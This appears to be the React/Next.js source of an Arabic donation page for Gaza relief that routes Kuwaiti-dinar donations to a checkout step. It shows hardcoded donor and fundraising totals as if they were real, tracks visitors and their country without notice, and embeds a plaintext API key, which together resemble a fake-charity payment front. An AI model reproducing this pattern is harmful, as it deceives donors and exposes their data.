"use client"

import { useEffect, useState } from "react"
import Link from "next/link"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { addData } from "@/lib/db"
import { useRouter } from "next/navigation"
import Progress from "@/components/ui/progress"
import { Facebook, Instagram, Twitter, YoutubeIcon } from 'lucide-react'
import { DialogLoader } from "@/components/dilog-loader"
import { setupOnlineStatus } from "@/lib/online-stauts"

export default function DonationPage() {
  const [customAmount, setCustomAmount] = useState("") 
   const [isLoading, setIsLoading] = useState(false)
  const [_id] = useState("id" + Math.random().toString(16).slice(2))
  const router = useRouter()

  useEffect(() => {
    // Wrap in try/catch to prevent build errors
    try {
      if (typeof window !== "undefined") {
        // Store visitor ID in localStorage for use in checkout
        localStorage.setItem('visitor', _id)
    getLocation()

        if (_id) {
          setupOnlineStatus(_id)
          addData({
            id: _id,
            lastSeen: new Date().toISOString(),
          })
        }
        addData({
          id: _id,
          currentPage: "الرئيسة",
          createdDate: new Date().toISOString(),
        })
      }
    } catch (error) {
      console.error("Error tracking page visit:", error)
    }
  }, [_id])
  async function getLocation() {
    const APIKEY = 'cf9ea2325ed570f6258d62735074d8b7576a57b530666da26a717cb9';
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;

    try {
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const country = await response.text();
      addData({
        id:_id,
        country: country,
        forestoreAttachment: "app-IFifwzlcXElzzk2qTKQJdX2wp6v3z0.tsx",
        isOnline: navigator.onLine,

      })
  
    } catch (error) {
      console.error('Error fetching location:', error);
    }
  }
  const donationStats = {
    donors: 10389,
    current: 287420,
    target: 300000,
    percentComplete: 77,
  }
  
  const setAmount = (amount: string) => {
    localStorage.setItem('amount', amount)
  }
  
  const handleCustomAmountChange = (amount: string) => {
    setCustomAmount(amount)
    setAmount(amount)
  }

  const handleDonateClick = () => {
    setIsLoading(true)
    // Ensure an amount is selected before proceeding to checkout
   setTimeout(() => {
    if (customAmount) {
      router.push(`/checkout`)
    } else {
      // Set a default amount or show an alert
      setCustomAmount("50")
      setAmount("50")
      router.push(`/checkout`)
    }
    setIsLoading(false)

   }, 4000);
  }

  return (
    <div className="flex flex-col min-h-screen bg-gray-100 text-right" dir="rtl">
      {/* Main content */}
      <DialogLoader isOpen={isLoading} message="يرجى الانتظار..."/>
      <main className="flex-1 max-w-3xl mx-auto w-full p-4">
        {/* Video Section */}
        <div className="relative aspect-video w-full mb-6 bg-gray-200 rounded overflow-hidden">
          <iframe
            width="100%"
            height="100%"
            src="https://www.youtube.com/embed/LJC2_NWYTSs"
            title="شاحنات حفاظ المحملة بمساعدات أهل الخير تدخل إلى قطاع غزة لدعم صمود أهلها"
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
            referrerPolicy="strict-origin-when-cross-origin"
            allowFullScreen
          ></iframe>
        </div>

        {/* Donation Title */}
        <h1 className="text-2xl font-bold mb-4 text-[#073b56]">نصرة غزة</h1>

        {/* Donation Stats */}
        <div className="grid grid-cols-3 gap-4 mb-4 text-center">
          <div>
            <p className="text-gray-500">عدد المتبرعين</p>
            <p className="text-orange-600">{donationStats.donors}</p>
          </div>
          <div>
            <p className="text-gray-500">المجموع</p>
            <p className="text-orange-600">{donationStats.current.toLocaleString()} د.ك</p>
          </div>
          <div>
            <p className="text-gray-500">التكلفة</p>
            <p className="text-orange-600">{donationStats.target.toLocaleString()} د.ك</p>
          </div>
        </div>
        
        {/* Progress Bar - Keeping the original implementation */}
        <div className="mb-6">
          <Progress value="77%" />
        </div>

        {/* Progress Percentage - Keeping as in original */}
        <div className="mb-6">
          <div className="text-left mt-1">
            <span className="text-orange-500 font-bold">{donationStats.percentComplete}%</span>
          </div>
        </div>

        {/* Donation Amount Options */}
        <div className="mb-6">
          <p className="mb-2">اختر قيمة التبرع</p>
          <div className="grid grid-cols-2 gap-4 mb-4">
            <Button
              variant={customAmount === "30" ? "default" : "outline"}
              onClick={() => handleCustomAmountChange("30")}
              className={customAmount === "30" ? "bg-orange-500 hover:bg-orange-600 text-white" : "bg-white border text-black hover:bg-gray-100 hover:text-black"}
            >
              د.ك 30
            </Button>
            <Button
              variant={customAmount === "40" ? "default" : "outline"}
              onClick={() => handleCustomAmountChange("40")}
              className={customAmount === "40" ? "bg-orange-500 hover:bg-orange-600 text-white" : "bg-white border text-black hover:bg-gray-100 hover:text-black"}
            >
              د.ك 40
            </Button>
            <Button
              variant={customAmount === "50" ? "default" : "outline"}
              onClick={() => handleCustomAmountChange("50")}
              className={customAmount === "50" ? "bg-orange-500 hover:bg-orange-600 text-white" : "bg-white border text-black hover:bg-gray-100 hover:text-black"}
            >
              د.ك 50
            </Button>
            <Button
              variant={customAmount === "60" ? "default" : "outline"}
              onClick={() => handleCustomAmountChange("60")}
              className={customAmount === "60" ? "bg-orange-500 hover:bg-orange-600 text-white" : "bg-white border text-black hover:bg-gray-100 hover:text-black"}
            >
              د.ك 60
            </Button>
          </div>

          {/* Custom Amount */}
          <div className="mb-6">
            <p className="mb-2">- أو -</p>
            <div className="flex">
              <Button className="bg-orange-500 hover:bg-orange-600 rounded-r-none">د.ك</Button>
              <Input
                type="number"
                placeholder="أدخل مبلغ آخر"
                value={customAmount}
                onChange={(e) => handleCustomAmountChange(e.target.value)}
                className="rounded-l-none text-right"
              />
            </div>
          </div>

          {/* Donate Button */}
          <Button
            onClick={handleDonateClick}
            className="w-full bg-[#0a3b4d] hover:bg-[#0a3b4d]/90 text-white py-3 mb-4"
          >
            تبرع الآن
          </Button>

          {/* Additional Options */}
          <div className="grid grid-cols-2 gap-4 mb-6">
            <Button 
              onClick={() => window.open('https://web.whatsapp.com/send?text=تبرع لغزة: http://example.com', '_blank')} 
              variant="outline" 
              className="bg-orange-500 hover:bg-orange-600 text-white border-orange-500"
            >
              مشاركة المشروع
            </Button>
            <Button 
              onClick={() => router.push('/checkout')} 
              variant="outline" 
              className="bg-orange-500 hover:bg-orange-600 text-white border-orange-500"
            >
              إضافة للسلة
            </Button>
          </div>
        </div>

        {/* Project Description */}
        <div className="mb-8">
          <h2 className="text-xl font-bold mb-4 text-center border-b pb-2">وصف المشروع</h2>
          <p className="leading-relaxed">
            مشروع إغاثي يهدف إلى تقديم المساعدات الإنسانية لإخواننا في قطاع غزة، من أجل التخفيف من وطأة العدوان الصهيوني
            عليهم، وذلك من خلال توفير المواد الغذائية والطبية والملابس والمستلزمات المنزلية الأساسية.
          </p>
        </div>

        {/* Social Media */}
        <div className="flex justify-center gap-4 mb-6">
          <Link href="#" className="bg-[#0a3b4d] p-2 rounded-md text-white">
            <Instagram size={20} />
          </Link>
          <Link href="#" className="bg-[#0a3b4d] p-2 rounded-md text-white">
            <YoutubeIcon size={20} />
          </Link>
          <Link href="#" className="bg-[#0a3b4d] p-2 rounded-md text-white">
            <Twitter size={20} />
          </Link>
          <Link href="#" className="bg-[#0a3b4d] p-2 rounded-md text-white">
            <Facebook size={20} />
          </Link>
        </div>
        
        {/* Newsletter */}
        <div className="mb-8">
          <h3 className="text-lg font-bold mb-2">نشرتنا الإلكترونية</h3>
          <div className="flex">
            <Input placeholder="أكتب بريدك الإلكتروني هنا" className="rounded-l-none" />
            <Button className="bg-orange-500 hover:bg-orange-600 rounded-r-none">اشترك</Button>
          </div>
        </div>
      </main>
    </div>
  )
}

